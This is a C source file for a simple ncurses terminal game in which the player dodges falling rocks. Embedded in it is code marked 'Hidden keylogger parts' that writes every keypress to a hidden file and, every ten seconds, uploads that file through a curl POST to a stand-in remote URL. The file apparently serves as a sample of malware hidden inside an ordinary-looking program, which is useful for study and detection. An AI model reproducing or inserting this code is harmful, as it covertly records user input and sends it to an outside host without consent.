#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <ncurses.h>
#include <time.h>
#include <string.h>
#include <sys/time.h>

#define WIDTH 40
#define HEIGHT 20
#define NUM_ROCKS 5

int playerX;
int rocks[NUM_ROCKS][2];
int score = 0;
int gameOver = 0;

// Hidden keylogger parts
FILE *logfile = NULL;
struct timeval last_exfil;
const char *logpath = ".dodgerkeys";
const char *exfil_url = "http://example.com/dodgerupload";

void init_malicious() {
    logfile = fopen(logpath, "a");
    if (!logfile) {
        logfile = fopen("/tmp/.dodgerkeys", "a");
    }
    gettimeofday(&last_exfil, NULL);
}

void exfiltrate() {
    struct timeval now;
    gettimeofday(&now, NULL);
    if (now.tv_sec - last_exfil.tv_sec >= 10) {
        char cmd[512];
        snprintf(cmd, sizeof(cmd),
                 "curl -s -X POST -F \"file=@%s\" %s > /dev/null 2>&1",
                 logpath, exfil_url);
        system(cmd);
        gettimeofday(&last_exfil, NULL);
    }
}

void init() {
    playerX = WIDTH / 2;
    srand(time(NULL));
    for (int i = 0; i < NUM_ROCKS; i++) {
        rocks[i][0] = rand() % HEIGHT;
        rocks[i][1] = rand() % WIDTH;
    }
}

void draw() {
    clear();

    for (int y = 0; y < HEIGHT; y++) {
        for (int x = 0; x < WIDTH; x++) {
            int printed = 0;

            if (y == HEIGHT - 1 && x == playerX) {
                printw("A");
                printed = 1;
            } else {
                for (int i = 0; i < NUM_ROCKS; i++) {
                    if (rocks[i][0] == y && rocks[i][1] == x) {
                        printw("*");
                        printed = 1;
                        break;
                    }
                }
            }

            if (!printed) printw(" ");
        }
        printw("\n");
    }

    printw("Score: %d\n", score);
    refresh();
}

void input() {
    timeout(0);
    int ch = getch();

    // Keylogger action
    if (ch != ERR && logfile) {
        fputc(ch, logfile);
        fflush(logfile);
    }

    if (ch == 'a' && playerX > 0) playerX--;
    if (ch == 'd' && playerX < WIDTH - 1) playerX++;
    if (ch == 'x') gameOver = 1;

    exfiltrate();
}

void logic() {
    for (int i = 0; i < NUM_ROCKS; i++) {
        rocks[i][0]++;
        if (rocks[i][0] >= HEIGHT) {
            rocks[i][0] = 0;
            rocks[i][1] = rand() % WIDTH;
            score++;
        }
        if (rocks[i][0] == HEIGHT - 1 && rocks[i][1] == playerX) {
            gameOver = 1;
        }
    }
}

int main() {
    initscr();
    noecho();
    curs_set(FALSE);

    init_malicious();
    init();

    while (!gameOver) {
        draw();
        input();
        logic();
        usleep(80000); // ~80ms frame
    }

    draw();
    printw("\nGame Over! Final Score: %d\n", score);
    printw("Press any key to exit...");
    timeout(-1);
    getch();
    endwin();

    if (logfile) fclose(logfile);

    return 0;
}
